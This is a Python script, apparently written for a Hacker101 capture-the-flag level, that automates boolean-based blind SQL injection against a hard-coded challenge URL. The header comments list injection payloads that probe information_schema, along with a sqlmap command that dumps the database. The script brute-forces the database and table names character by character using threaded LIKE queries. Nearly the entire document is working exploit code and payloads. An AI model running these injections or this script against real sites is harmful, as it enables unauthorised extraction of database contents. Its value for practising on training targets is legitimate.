#!/usr/bin/env python
#
# link for the CTF: https://ctf.hacker101.com/ctf
#
# This script is not really a solve for the CTF but if you're wondering 
# how to get the information from the database this script is 
# gonna automate it for you .
# if you want to get the flag run sqlmap:
# sqlmap -u "http://35.190.155.168/0f0154aa10/fetch?id=1" --dump --batch
# 
# count for database name: fetch?id=1 AND length(database())=6
# get the db name: fetch?id=1 AND database() LIKE '%%%%%%'
#
# count for tables in database: fetch?id=1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=2
# 
# Table1 name length: fetch?id=1 AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)=6
# get the name: fetch?id=1 AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1) LIKE '%%%%%%'
#
# table2 length: fetch?id=1 AND (SELECT LENGTH(table_name) FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1)=6
# Get the name: fetch?id=1 AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1) LIKE '%%%%%%'
#

from concurrent.futures import ThreadPoolExecutor as executor
import requests, sys

results = ['_','_','_','_','_','_']
name = ['%','_','%','_','%','_']
lol = "abcdefghijklmnopqrstuvwxyz1234567890"


def printer(shit):
	sys.stdout.write(shit+"                               \r")
	sys.stdout.flush()
	return True


def scan(position,like,target):
	for i in lol:
		global results
		like = ['_','_','_','_','_','_']
		like[position] = i
		# change the url here!
		url = "http://35.190.155.168/0f0154aa10/fetch?id=1"
		if target == 'database':
			query = " and database() LIKE"
		elif target == 'table1':
			query = " AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1) LIKE"
		elif target == 'table2':
			query = " AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1) LIKE"
		data = "".join(like)

		try:
			req = requests.get(url + query + " '%s'" % data)
		except requests.exceptions.ConnectionError:
			req = requests.get(url + query + " '%s'" % data)

		printer("Status: "+str(req.status_code)+" | Data: "+data)
		if req.status_code == 200:
			results[position] = i
			res = "".join(results)
			print("[+] Found: "+res+"                   \r")
			return True
	

for target in ['database','table1','table2']:
	print("\n[+] Getting the name of The: "+target)
	with executor(max_workers=6) as exe:
		[exe.submit(scan, i, name, target) for i in range(6)]
	res = "".join(results)
	print("[*] "+target + " Found: "+res)
	results = ['_','_','_','_','_','_']
	
